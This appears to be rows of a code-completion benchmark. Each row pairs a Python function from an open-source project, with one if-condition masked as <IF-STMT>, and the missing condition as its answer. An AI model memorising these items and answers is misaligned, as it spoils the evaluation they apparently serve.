2462,"def closeEvent(self, e=None):<tab>""""""Save settings and remove registered logging handler""""""<tab>if self.editor.isModified():<tab><tab># ask if user wants to save<tab><tab><IF-STMT><tab><tab><tab>if self.save():<tab><tab><tab><tab>e.accept()<tab><tab><tab>else:<tab><tab><tab><tab># saving error or user canceled<tab><tab><tab><tab>e.ignore()<tab><tab>else:<tab><tab><tab># discard changes<tab><tab><tab>e.accept()<tab>else:<tab><tab># unchanged<tab><tab>e.accept()",if self . wants_save ( ) :,133
2463,"def readlines(self, hint=None):<tab>if self.chunked_input:<tab><tab>lines = []<tab><tab>for line in iter(self.readline, b""""):<tab><tab><tab>lines.append(line)<tab><tab><tab>if hint and hint > 0:<tab><tab><tab><tab>hint -= len(line)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab>return lines<tab>else:<tab><tab>return self._do_read(self.rfile.readlines, hint)",if hint <= 0 :,117
2464,"def test_prod(self):<tab>with gpytorch.settings.fast_computations(covar_root_decomposition=False):<tab><tab>lazy_tensor = self.create_lazy_tensor()<tab><tab>evaluated = self.evaluate_lazy_tensor(lazy_tensor)<tab><tab><IF-STMT><tab><tab><tab>self.assertAllClose(<tab><tab><tab><tab>lazy_tensor.prod(-3).evaluate(),<tab><tab><tab><tab>evaluated.prod(-3),<tab><tab><tab><tab>**self.tolerances[""prod""]<tab><tab><tab>)<tab><tab>if lazy_tensor.ndimension() > 3:<tab><tab><tab>self.assertAllClose(<tab><tab><tab><tab>lazy_tensor.prod(-4).evaluate(),<tab><tab><tab><tab>evaluated.prod(-4),<tab><tab><tab><tab>**self.tolerances[""prod""]<tab><tab><tab>)",if lazy_tensor . ndimension ( ) > 2 :,195
2465,"def make_module_translation_map(names: List[str]) -> Dict[str, str]:<tab>num_instances = {}  # type: Dict[str, int]<tab>for name in names:<tab><tab>for suffix in candidate_suffixes(name):<tab><tab><tab>num_instances[suffix] = num_instances.get(suffix, 0) + 1<tab>result = {}<tab>for name in names:<tab><tab>for suffix in candidate_suffixes(name):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result[name] = suffix<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>assert False, names<tab>return result",if num_instances [ suffix ] == 1 :,154
2466,"def output(self):<tab>""""""Transform self into a list of (name, value) tuples.""""""<tab>header_list = []<tab>for k, v in self.items():<tab><tab>if isinstance(k, unicodestr):<tab><tab><tab>k = self.encode(k)<tab><tab><IF-STMT><tab><tab><tab>v = str(v)<tab><tab>if isinstance(v, unicodestr):<tab><tab><tab>v = self.encode(v)<tab><tab># See header_translate_* constants above.<tab><tab># Replace only if you really know what you're doing.<tab><tab>k = k.translate(header_translate_table, header_translate_deletechars)<tab><tab>v = v.translate(header_translate_table, header_translate_deletechars)<tab><tab>header_list.append((k, v))<tab>return header_list","if not isinstance ( v , basestring ) :",197
2467,"def get_errors(self, attacked_text, use_cache=False):<tab>text = attacked_text.text<tab>if use_cache:<tab><tab><IF-STMT><tab><tab><tab>self.grammar_error_cache[text] = len(self.lang_tool.check(text))<tab><tab>return self.grammar_error_cache[text]<tab>else:<tab><tab>return len(self.lang_tool.check(text))",if text not in self . grammar_error_cache :,110
2468,"def gen():<tab>for _ in range(256):<tab><tab>if seq:<tab><tab><tab>yield self.tb.dut.i.eq(seq.pop(0))<tab><tab>i = yield self.tb.dut.i<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(i, 0)<tab><tab>else:<tab><tab><tab>o = yield self.tb.dut.o<tab><tab><tab>if o > 0:<tab><tab><tab><tab>self.assertEqual(i & 1 << (o - 1), 0)<tab><tab><tab>self.assertGreaterEqual(i, 1 << o)<tab><tab>yield",if ( yield self . tb . dut . n ) :,149
2469,"def _register_builtin_handlers(self, events):<tab>for spec in handlers.BUILTIN_HANDLERS:<tab><tab><IF-STMT><tab><tab><tab>event_name, handler = spec<tab><tab><tab>self.register(event_name, handler)<tab><tab>else:<tab><tab><tab>event_name, handler, register_type = spec<tab><tab><tab>if register_type is handlers.REGISTER_FIRST:<tab><tab><tab><tab>self._events.register_first(event_name, handler)<tab><tab><tab>elif register_type is handlers.REGISTER_LAST:<tab><tab><tab><tab>self._events.register_last(event_name, handler)",if len ( spec ) == 2 :,148
2470,"def is_checked_sls_template(template):<tab>if template.__contains__(""provider""):<tab><tab># Case provider is a dictionary<tab><tab><IF-STMT><tab><tab><tab>if template[""provider""].get(""name"").lower() not in SUPPORTED_PROVIDERS:<tab><tab><tab><tab>return False<tab><tab># Case provider is direct provider name<tab><tab>if isinstance(template[""provider""], str_node):<tab><tab><tab>if template[""provider""] not in SUPPORTED_PROVIDERS:<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False","if isinstance ( template [ ""provider"" ] , dict_node ) :",131
2471,"def decode_body(self, response):<tab>if response is None:<tab><tab>return response<tab>if six.PY2:<tab><tab>return response<tab>if response.body:<tab><tab># Decode it<tab><tab><IF-STMT><tab><tab><tab>response._body = response.body.decode(""utf-8"")<tab><tab>else:<tab><tab><tab>response._body = salt.ext.tornado.escape.native_str(response.body)<tab>return response","if response . headers . get ( ""Content-Type"" ) == ""application/json"" :",120
2472,"def get_active_project_path():<tab>window = sublime.active_window()<tab>folders = window.folders()<tab>if len(folders) == 1:<tab><tab>return folders[0]<tab>else:<tab><tab>active_view = window.active_view()<tab><tab>active_file_name = active_view.file_name() if active_view else None<tab><tab>if not active_file_name:<tab><tab><tab>return folders[0] if len(folders) else os.path.expanduser(""~"")<tab><tab>for folder in folders:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return folder<tab><tab>return os.path.dirname(active_file_name)",if active_file_name . startswith ( folder ) :,166
2473,"def pop(self, *a):<tab>lists = self.lists<tab>if len(lists) == 1 and not a:<tab><tab>return self.lists[0].pop()<tab>index = a and a[0]<tab>if index == () or index is None or index == -1:<tab><tab>ret = lists[-1].pop()<tab><tab>if len(lists) > 1 and not lists[-1]:<tab><tab><tab>lists.pop()<tab>else:<tab><tab>list_idx, rel_idx = self._translate_index(index)<tab><tab><IF-STMT><tab><tab><tab>raise IndexError()<tab><tab>ret = lists[list_idx].pop(rel_idx)<tab><tab>self._balance_list(list_idx)<tab>return ret",if list_idx is None :,176
2474,"def setup(self, gen):<tab>Node.setup(self, gen)<tab>try:<tab><tab>self.target = gen.rules[self.name]<tab><tab><IF-STMT><tab><tab><tab>self.accepts_epsilon = self.target.accepts_epsilon<tab><tab><tab>gen.changed()<tab>except KeyError:  # Oops, it's nonexistent<tab><tab>print >>sys.stderr, ""Error: no rule <%s>"" % self.name<tab><tab>self.target = self",if self . accepts_epsilon != self . target . accepts_epsilon :,125
2475,"def match(self, userargs):<tab># Early skip if command or number of args don't match<tab>if len(self.args) != len(userargs):<tab><tab># DENY: argument numbers don't match<tab><tab>return False<tab># Compare each arg (anchoring pattern explicitly at end of string)<tab>for (pattern, arg) in zip(self.args, userargs):<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>except re.error:<tab><tab><tab># DENY: Badly-formed filter<tab><tab><tab>return False<tab>else:<tab><tab># ALLOW: All arguments matched<tab><tab>return True<tab># DENY: Some arguments did not match<tab>return False","if not re . match ( pattern + ""$"" , arg ) :",180
2476,"def broadcast(self, msg, eid):<tab>for s in self.subs:<tab><tab>if type(self.subs[s].eid) is list:<tab><tab><tab>if eid in self.subs[s].eid:<tab><tab><tab><tab>self.subs[s].write_message(msg)<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.subs[s].write_message(msg)",if self . subs [ s ] . eid == eid :,111
2477,"def apply_transformation(self, ti: TransformationInput) -> Transformation:<tab>fragments = ti.fragments<tab># Walk through all te fragments.<tab>if fragments and fragment_list_to_text(fragments).startswith("" ""):<tab><tab>t = (self.style, self.get_char())<tab><tab>fragments = explode_text_fragments(fragments)<tab><tab>for i in range(len(fragments)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fragments[i] = t<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>return Transformation(fragments)","if fragments [ i ] [ 1 ] == "" "" :",138
2478,"def _url_encode_impl(obj, charset, encode_keys, sort, key):<tab>iterable = sdict()<tab>for key, values in obj.items():<tab><tab><IF-STMT><tab><tab><tab>values = [values]<tab><tab>iterable[key] = values<tab>if sort:<tab><tab>iterable = sorted(iterable, key=key)<tab>for key, values in iterable.items():<tab><tab>for value in values:<tab><tab><tab>if value is None:<tab><tab><tab><tab>continue<tab><tab><tab>if not isinstance(key, bytes):<tab><tab><tab><tab>key = str(key).encode(charset)<tab><tab><tab>if not isinstance(value, bytes):<tab><tab><tab><tab>value = str(value).encode(charset)<tab><tab><tab>yield url_quote_plus(key) + ""="" + url_quote_plus(value)","if not isinstance ( values , list ) :",198
2479,"def get_objects(self) -> Iterator[Tuple[str, str, str, str, str, int]]:<tab>rootSymbol = self.data[""root_symbol""]<tab>for symbol in rootSymbol.get_all_symbols():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>assert symbol.docname<tab><tab>fullNestedName = symbol.get_full_nested_name()<tab><tab>name = str(fullNestedName).lstrip(""."")<tab><tab>dispname = fullNestedName.get_display_string().lstrip(""."")<tab><tab>objectType = symbol.declaration.objectType<tab><tab>docname = symbol.docname<tab><tab>newestId = symbol.declaration.get_newest_id()<tab><tab>yield (name, dispname, objectType, docname, newestId, 1)",if symbol . declaration is None :,181
2480,"def _delete_duplicates(l, keep_last):<tab>""""""Delete duplicates from a sequence, keeping the first or last.""""""<tab>seen = {}<tab>result = []<tab>if keep_last:  # reverse in & out, then keep first<tab><tab>l.reverse()<tab>for i in l:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result.append(i)<tab><tab><tab><tab>seen[i] = 1<tab><tab>except TypeError:<tab><tab><tab># probably unhashable.  Just keep it.<tab><tab><tab>result.append(i)<tab>if keep_last:<tab><tab>result.reverse()<tab>return result",if i not in seen :,155
2481,"def combine_logs(audit_logs, statement_text_logs):<tab>for audit_transaction in audit_logs:<tab><tab>for audit_query in audit_logs[audit_transaction]:<tab><tab><tab>matching_statement_text_logs = statement_text_logs.get(hash(audit_query))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>statement_text_log = matching_statement_text_logs.pop()<tab><tab><tab><tab>if statement_text_log:<tab><tab><tab><tab><tab>if statement_text_log.start_time:<tab><tab><tab><tab><tab><tab>audit_query.start_time = statement_text_log.start_time<tab><tab><tab><tab><tab>if statement_text_log.end_time:<tab><tab><tab><tab><tab><tab>audit_query.end_time = statement_text_log.end_time",if matching_statement_text_logs :,197
2482,"def free(self, addr, ban=0):<tab>with self.lock:<tab><tab>if ban != 0:<tab><tab><tab>self.ban.append({""addr"": addr, ""counter"": ban})<tab><tab>else:<tab><tab><tab>base, bit, is_allocated = self.locate(addr)<tab><tab><tab>if len(self.addr_map) <= base:<tab><tab><tab><tab>raise KeyError(""address is not allocated"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise KeyError(""address is not allocated"")<tab><tab><tab>self.allocated -= 1<tab><tab><tab>self.addr_map[base] ^= 1 << bit",if self . addr_map [ base ] & ( 1 << bit ) :,155
2483,"def _assertParseMethod(test, code_str, method, expect_success=True):<tab>arena, c_parser = InitCommandParser(code_str)<tab>m = getattr(c_parser, method)<tab>node = m()<tab>if node:<tab><tab>ast_lib.PrettyPrint(node)<tab><tab>if not expect_success:<tab><tab><tab>test.fail(""Expected %r to fail "" % code_str)<tab>else:<tab><tab># TODO: Could copy PrettyPrintError from pysh.py<tab><tab>err = c_parser.Error()<tab><tab>print(err)<tab><tab>ui.PrintErrorStack(err, arena, sys.stdout)<tab><tab><IF-STMT><tab><tab><tab>test.fail(""%r failed"" % code_str)<tab>return node",if expect_success :,186
2484,"def _gen():<tab>while True:<tab><tab>try:<tab><tab><tab>loop_val = it.next()  # e.g. x<tab><tab>except StopIteration:<tab><tab><tab>break<tab><tab>self.mem.SetValue(<tab><tab><tab>lvalue.Named(iter_name), value.Obj(loop_val), scope_e.LocalOnly<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>b = self.EvalExpr(comp.cond)<tab><tab>else:<tab><tab><tab>b = True<tab><tab>if b:<tab><tab><tab>item = self.EvalExpr(node.elt)  # e.g. x*2<tab><tab><tab>yield item",if comp . cond :,155
2485,"def _build_default_obj_recursive(self, _properties, res):<tab>""""""takes disparate and nested default keys, and builds up a default object""""""<tab>for key, prop in _properties.items():<tab><tab><IF-STMT><tab><tab><tab>res[key] = copy(prop[""default""])<tab><tab>elif prop.get(""type"") == ""object"" and ""properties"" in prop:<tab><tab><tab>res.setdefault(key, {})<tab><tab><tab>res[key] = self._build_default_obj_recursive(prop[""properties""], res[key])<tab>return res","if ""default"" in prop and key not in res :",143
2486,"def mean(self):<tab>""""""Compute the mean of the value_field in the window.""""""<tab>if len(self.data) > 0:<tab><tab>datasum = 0<tab><tab>datalen = 0<tab><tab>for dat in self.data:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>datasum += dat[1]<tab><tab><tab><tab>datalen += 1<tab><tab>if datalen > 0:<tab><tab><tab>return datasum / float(datalen)<tab><tab>return None<tab>else:<tab><tab>return None","if ""placeholder"" not in dat [ 0 ] :",132
2487,"def addNames(self, import_names, node_names):<tab>for names in node_names:<tab><tab><IF-STMT><tab><tab><tab>name = names<tab><tab>elif names[1] is None:<tab><tab><tab>name = names[0]<tab><tab>else:<tab><tab><tab>name = names[1]<tab><tab>import_names[name] = True","if isinstance ( names , basestring ) :",88
2488,"def set(sensor_spec: dict, **kwargs):<tab>for key, value in kwargs.items():<tab><tab><IF-STMT><tab><tab><tab>sensor_spec[""transform""] = SensorSpecs.get_position(value)<tab><tab>elif key == ""attachment_type"":<tab><tab><tab>sensor_spec[key] = SensorSpecs.ATTACHMENT_TYPE[value]<tab><tab>elif key == ""color_converter"":<tab><tab><tab>sensor_spec[key] = SensorSpecs.COLOR_CONVERTER[value]","if key == ""position"" :",125
2489,"def delete_session(self):<tab>cookie = self.headers.get(HTTP_HEADER.COOKIE)<tab>if cookie:<tab><tab>match = re.search(r""%s=(.+)"" % SESSION_COOKIE_NAME, cookie)<tab><tab>if match:<tab><tab><tab>session = match.group(1)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del SESSIONS[session]",if session in SESSIONS :,92
2490,"def rename_var(block: paddle.device.framework.Block, old_name: str, new_name: str):<tab>"""""" """"""<tab>for op in block.ops:<tab><tab>for input_name in op.input_arg_names:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>op._rename_input(old_name, new_name)<tab><tab>for output_name in op.output_arg_names:<tab><tab><tab>if output_name == old_name:<tab><tab><tab><tab>op._rename_output(old_name, new_name)<tab>block._rename_var(old_name, new_name)",if input_name == old_name :,155
2491,"def updateParticle(part, best, phi1, phi2):<tab>u1 = numpy.random.uniform(0, phi1, len(part))<tab>u2 = numpy.random.uniform(0, phi2, len(part))<tab>v_u1 = u1 * (part.best - part)<tab>v_u2 = u2 * (best - part)<tab>part.speed += v_u1 + v_u2<tab>for i, speed in enumerate(part.speed):<tab><tab><IF-STMT><tab><tab><tab>part.speed[i] = math.copysign(part.smin, speed)<tab><tab>elif abs(speed) > part.smax:<tab><tab><tab>part.speed[i] = math.copysign(part.smax, speed)<tab>part += part.speed",if abs ( speed ) < part . smin :,197
2492,"def acquire(self, blocking=True, timeout=None):<tab>if not blocking and timeout is not None:<tab><tab>raise ValueError(""can't specify timeout for non-blocking acquire"")<tab>rc = False<tab>endtime = None<tab>self._cond.acquire()<tab>while self._value == 0:<tab><tab>if not blocking:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>if endtime is None:<tab><tab><tab><tab>endtime = _time() + timeout<tab><tab><tab>else:<tab><tab><tab><tab>timeout = endtime - _time()<tab><tab><tab><tab>if timeout <= 0:<tab><tab><tab><tab><tab>break<tab><tab>self._cond.wait(timeout)<tab>else:<tab><tab>self._value = self._value - 1<tab><tab>rc = True<tab>self._cond.release()<tab>return rc",if timeout is not None :,194
2493,"def test_ESPnetDataset_text_float(text_float):<tab>dataset = IterableESPnetDataset(<tab><tab>path_name_type_list=[(text_float, ""data8"", ""text_float"")],<tab><tab>preprocess=preprocess,<tab>)<tab>for key, data in dataset:<tab><tab><IF-STMT><tab><tab><tab>assert all((data[""data8""]) == np.array([1.4, 3.4], dtype=np.float32))<tab><tab>if key == ""b"":<tab><tab><tab>assert all((data[""data8""]) == np.array([0.9, 9.3], dtype=np.float32))","if key == ""a"" :",152
2494,"def __eq__(self, other):<tab>if isinstance(other, OrderedDict):<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>for p, q in zip(list(self.items()), list(other.items())):<tab><tab><tab>if p != q:<tab><tab><tab><tab>return False<tab><tab>return True<tab>return dict.__eq__(self, other)",if len ( self ) != len ( other ) :,91
2495,"def exec_command(command, cwd=None, stdout=None, env=None):<tab>""""""Returns True in the command was executed successfully""""""<tab>try:<tab><tab>command_list = command if isinstance(command, list) else command.split()<tab><tab>env_vars = os.environ.copy()<tab><tab><IF-STMT><tab><tab><tab>env_vars.update(env)<tab><tab>subprocess.check_call(command_list, stdout=stdout, cwd=cwd, env=env_vars)<tab><tab>return True<tab>except subprocess.CalledProcessError as err:<tab><tab>print(err, file=sys.stderr)<tab><tab>return False",if env :,146
2496,"def _get_lun_details(self, lun_id):<tab>""""""Given the ID of a LUN, get the details about that LUN""""""<tab>server = self.client.service<tab>res = server.LunListInfoIterStart(ObjectNameOrId=lun_id)<tab>tag = res.Tag<tab>try:<tab><tab>res = server.LunListInfoIterNext(Tag=tag, Maximum=1)<tab><tab><IF-STMT><tab><tab><tab>return res.Luns.LunInfo[0]<tab>finally:<tab><tab>server.LunListInfoIterEnd(Tag=tag)","if hasattr ( res , ""Luns"" ) and res . Luns . LunInfo :",162
2497,"def _process_events(self, event_list):<tab>for key, mask in event_list:<tab><tab>fileobj, (reader, writer) = key.fileobj, key.data<tab><tab>if mask & selectors.EVENT_READ and reader is not None:<tab><tab><tab>if reader._cancelled:<tab><tab><tab><tab>self.remove_reader(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(reader)<tab><tab><IF-STMT><tab><tab><tab>if writer._cancelled:<tab><tab><tab><tab>self.remove_writer(fileobj)<tab><tab><tab>else:<tab><tab><tab><tab>self._add_callback(writer)",if mask & selectors . EVENT_WRITE and writer is not None :,158
2498,"def process_doc(self, docstrings: List[List[str]]) -> Iterator[str]:<tab>""""""Let the user process the docstrings before adding them.""""""<tab>for docstringlines in docstrings:<tab><tab>if self.env.app:<tab><tab><tab># let extensions preprocess docstrings<tab><tab><tab>self.env.app.emit(<tab><tab><tab><tab>""autodoc-process-docstring"",<tab><tab><tab><tab>self.objtype,<tab><tab><tab><tab>self.fullname,<tab><tab><tab><tab>self.object,<tab><tab><tab><tab>self.options,<tab><tab><tab><tab>docstringlines,<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab><tab><tab># append a blank line to the end of the docstring<tab><tab><tab><tab>docstringlines.append("""")<tab><tab>yield from docstringlines","if docstringlines and docstringlines [ - 1 ] != """" :",185
2499,"def vectorize(self, doc, vocab, char_vocab):<tab>words = np.asarray(<tab><tab>[vocab[w.lower()] if w.lower() in vocab else 1 for w in doc]<tab>).reshape(1, -1)<tab>sentence_chars = []<tab>for w in doc:<tab><tab>word_chars = []<tab><tab>for c in w:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_cid = char_vocab[c]<tab><tab><tab>else:<tab><tab><tab><tab>_cid = 1<tab><tab><tab>word_chars.append(_cid)<tab><tab>sentence_chars.append(word_chars)<tab>sentence_chars = np.expand_dims(<tab><tab>pad_sentences(sentence_chars, self.model.word_length), axis=0<tab>)<tab>return words, sentence_chars",if c in char_vocab :,196
2500,"def runtestenv(venv, config, redirect=False):<tab>if venv.status == 0 and config.option.notest:<tab><tab>venv.status = ""skipped tests""<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>config.pluginmanager.hook.tox_runtest_pre(venv=venv)<tab><tab>if venv.status == 0:<tab><tab><tab>config.pluginmanager.hook.tox_runtest(venv=venv, redirect=redirect)<tab><tab>config.pluginmanager.hook.tox_runtest_post(venv=venv)",if venv . status :,133
2501,"def _import_config_module(self, name):<tab>try:<tab><tab>self.find_module(name)<tab>except NotAPackage:<tab><tab><IF-STMT><tab><tab><tab>reraise(<tab><tab><tab><tab>NotAPackage,<tab><tab><tab><tab>NotAPackage(CONFIG_WITH_SUFFIX.format(module=name, suggest=name[:-3])),<tab><tab><tab><tab>sys.exc_info()[2],<tab><tab><tab>)<tab><tab>reraise(<tab><tab><tab>NotAPackage,<tab><tab><tab>NotAPackage(CONFIG_INVALID_NAME.format(module=name)),<tab><tab><tab>sys.exc_info()[2],<tab><tab>)<tab>else:<tab><tab>return self.import_from_cwd(name)","if name . endswith ( "".py"" ) :",172
2502,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_format(d.getVarInt32())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_path(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 8 :,120
2503,"def get(self, request, *args, **kwargs):<tab># Generate sidebar forms<tab>self.sidebar_forms = []<tab>for form_id, (plugin, Form) in self.get_sidebar_form_classes().items():<tab><tab><IF-STMT><tab><tab><tab>form = Form(self.article, self.request.user)<tab><tab><tab>setattr(form, ""form_id"", form_id)<tab><tab>else:<tab><tab><tab>form = None<tab><tab>self.sidebar.append((plugin, form))<tab>return super().get(request, *args, **kwargs)",if Form :,135
2504,"def check_click(self):<tab>if not isinstance(self, SwiDebugView):<tab><tab>return<tab>cursor = self.sel()[0].a<tab>index = 0<tab>click_regions = self.get_regions(""swi_log_clicks"")<tab>for callback in click_regions:<tab><tab>if cursor > callback.a and cursor < callback.b:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>callback = self.callbacks[index]<tab><tab><tab><tab>callback[""callback""](*callback[""args""])<tab><tab>index += 1",if index < len ( self . callbacks ) :,131
2505,"def get_sock(port):<tab>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<tab>while True:<tab><tab>try:<tab><tab><tab>_port = port or random.randint(1025, 5000)<tab><tab><tab>print((""try bind local port:"", _port))<tab><tab><tab>sock.bind((""0.0.0.0"", _port))<tab><tab><tab>return sock<tab><tab>except socket.error as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print((""bind local port %d fail: %r"" % (_port, e)))<tab><tab><tab><tab>return<tab><tab><tab>if e.args[0] == errno.EADDRINUSE:<tab><tab><tab><tab>pass",if port :,166
2506,"def ParsePlacemark(self, node):<tab>ret = Placemark()<tab>for child in node.childNodes:<tab><tab>if child.nodeName == ""name"":<tab><tab><tab>ret.name = self.ExtractText(child)<tab><tab><IF-STMT><tab><tab><tab>ret.coordinates = self.ExtractCoordinates(child)<tab>return ret","if child . nodeName == ""Point"" or child . nodeName == ""LineString"" :",94
2507,"def _load_library(self):<tab>if self.library is not None:<tab><tab><IF-STMT><tab><tab><tab>name, mod_path = self.library<tab><tab>else:<tab><tab><tab>name = mod_path = self.library<tab><tab>try:<tab><tab><tab>module = importlib.import_module(mod_path)<tab><tab>except ImportError:<tab><tab><tab>raise ValueError(""Couldn't load %s password algorithm "" ""library"" % name)<tab><tab>return module<tab>raise ValueError(""Hasher '%s' doesn't specify a library attribute"" % self.__class__)","if isinstance ( self . library , ( tuple , list ) ) :",139
2508,"def check(self):<tab>for r in self.results:<tab><tab><IF-STMT><tab><tab><tab>assert r.backend.name == self.target.path.k8s, (<tab><tab><tab><tab>r.backend.name,<tab><tab><tab><tab>self.target.path.k8s,<tab><tab><tab>)<tab><tab><tab>assert r.backend.request.headers[""x-envoy-original-path""][0] in (<tab><tab><tab><tab>f""/{self.name}/"",<tab><tab><tab><tab>f""/{self.name}-nested/"",<tab><tab><tab>)",if r . backend :,135
2509,"def eval(self, code, eval=True, raw=False):<tab>self._engine._append_source(code)<tab>try:<tab><tab>result = self._context.eval(code)<tab>except quickjs.JSException as e:<tab><tab>raise ProgramError(*e.args)<tab>else:<tab><tab>if eval:<tab><tab><tab>if raw or not isinstance(result, quickjs.Object):<tab><tab><tab><tab>return result<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return self.Function(self, result)<tab><tab><tab>else:<tab><tab><tab><tab>return json.loads(result.json())","elif callable ( result ) and self . typeof ( result ) == u""function"" :",158
2510,"def __truediv__(self, val):<tab>if isinstance(val, Vector3):<tab><tab><IF-STMT><tab><tab><tab>raise ZeroDivisionError()<tab><tab>gd_obj = lib.godot_vector3_operator_divide_vector(self._gd_ptr, val._gd_ptr)<tab>else:<tab><tab>if val is 0:<tab><tab><tab>raise ZeroDivisionError()<tab><tab>gd_obj = lib.godot_vector3_operator_divide_scalar(self._gd_ptr, val)<tab>return Vector3.build_from_gdobj(gd_obj)",if val . x == 0 or val . y == 0 or val . z == 0 :,148
2511,"def set_peek(self, dataset, is_multi_byte=False):<tab>if not dataset.dataset.purged:<tab><tab>dataset.peek = data.get_file_peek(dataset.file_name)<tab><tab><IF-STMT><tab><tab><tab>dataset.blurb = ""%s sequences"" % util.commaify(<tab><tab><tab><tab>str(dataset.metadata.sequences)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>dataset.blurb = nice_size(dataset.get_size())<tab>else:<tab><tab>dataset.peek = ""file does not exist""<tab><tab>dataset.blurb = ""file purged from disk""",if dataset . metadata . sequences :,153
2512,"def _get_plugin_src_dirs(base_dir):<tab>plug_in_base_path = Path(get_src_dir(), base_dir)<tab>plugin_dirs = get_dirs_in_dir(str(plug_in_base_path))<tab>plugins = []<tab>for plugin_path in plugin_dirs:<tab><tab>plugin_code_dir = Path(plugin_path, ""code"")<tab><tab><IF-STMT><tab><tab><tab>plugins.append(str(plugin_code_dir))<tab><tab>else:<tab><tab><tab>logging.warning(""Plugin has no code directory: {}"".format(plugin_path))<tab>return plugins",if plugin_code_dir . is_dir ( ) :,155
2513,"def _format_privilege_data(self, data):<tab>for key in [""spcacl""]:<tab><tab>if key in data and data[key] is not None:<tab><tab><tab>if ""added"" in data[key]:<tab><tab><tab><tab>data[key][""added""] = parse_priv_to_db(data[key][""added""], self.acl)<tab><tab><tab>if ""changed"" in data[key]:<tab><tab><tab><tab>data[key][""changed""] = parse_priv_to_db(data[key][""changed""], self.acl)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[key][""deleted""] = parse_priv_to_db(data[key][""deleted""], self.acl)","if ""deleted"" in data [ key ] :",168
2514,"def __init__(self, methodName=""runTest""):<tab>unittest.TestCase.__init__(self, methodName)<tab># We expect files to be relative to this test script.<tab>test_dir = dirname(dirname(__file__))<tab>self._dir = normpath(join(test_dir, ""stuff/charsets/www.kostis.net/charsets""))<tab>self._enc = {}<tab># get all the utf-8 files in this dir, and well recode them<tab>names = os.listdir(self._dir)<tab>for name in names:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>enc = name.split(""."")[0]<tab><tab>if decoderAvailable(enc):<tab><tab><tab>self._enc[enc] = name","if not os . path . isfile ( os . path . join ( self . _dir , name ) ) :",187
2515,"def get_actions_on_list(self, actions, modelview_name):<tab>res_actions = dict()<tab>for action_key in actions:<tab><tab>action = actions[action_key]<tab><tab><IF-STMT><tab><tab><tab>res_actions[action_key] = action<tab>return res_actions","if self . is_item_visible ( action . name , modelview_name ) and action . multiple :",93
2516,"def triger_check_network(self, fail=False, force=False):<tab>time_now = time.time()<tab>if not force:<tab><tab>if self._checking_num > 0:<tab><tab><tab>return<tab><tab>if fail or self.network_stat != ""OK"":<tab><tab><tab># Fail or unknown<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab>else:<tab><tab><tab>if time_now - self.last_check_time < 10:<tab><tab><tab><tab>return<tab>self.last_check_time = time_now<tab>threading.Thread(target=self._simple_check_worker).start()",if time_now - self . last_check_time < 3 :,161
2517,"def write(self, root):<tab>""""""Write all the *descendants* of an .dart node.""""""<tab>root_level = root.level()<tab>for p in root.subtree():<tab><tab>indent = p.level() - root_level<tab><tab>self.put(""%s %s"" % (""*"" * indent, p.h))<tab><tab>for s in p.b.splitlines(False):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.put(s)<tab>root.setVisited()<tab>return True",if not g . isDirective ( s ) :,127
2518,"def characters(self, ch):<tab>if self.Text_tag:<tab><tab><IF-STMT><tab><tab><tab>self.Summary_ch += ch<tab><tab>elif self.Attack_Prerequisite_tag:<tab><tab><tab>self.Attack_Prerequisite_ch += ch<tab><tab>elif self.Solution_or_Mitigation_tag:<tab><tab><tab>self.Solution_or_Mitigation_ch += ch<tab>elif self.CWE_ID_tag:<tab><tab>self.CWE_ID_ch += ch",if self . Summary_tag :,127
2519,"def _handle_function(self, addr):<tab>if self.arch.name == ""X86"":<tab><tab>try:<tab><tab><tab>b = self._project.loader.memory.load(addr, 4)<tab><tab>except KeyError:<tab><tab><tab>return<tab><tab>except TypeError:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab># getpc:<tab><tab><tab>#   mov ebx, [esp]<tab><tab><tab>#   ret<tab><tab><tab>ebx_offset = self.arch.registers[""ebx""][0]<tab><tab><tab>self.state.store_register(ebx_offset, 4, self.block.addr + self.block.size)","if b == b""\x8b\x1c\x24\xc3"" :",171
